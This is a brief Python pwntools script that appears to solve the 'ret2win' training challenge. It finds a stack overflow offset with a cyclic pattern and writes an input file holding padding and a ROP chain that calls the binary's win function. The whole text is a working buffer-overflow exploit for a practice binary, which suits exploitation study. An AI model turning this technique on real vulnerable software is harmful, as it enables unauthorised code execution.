#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'


open('cyclic.txt', 'w').write(cyclic(50, n=8) + '\n')
N = cyclic_find('faaaaaaag', n=8)

e = ELF('ret2win')
rop = ROP(e)
rop.call('ret2win')
open('input.txt', 'wb').write(b'A' * N + rop.chain() + b'\n')
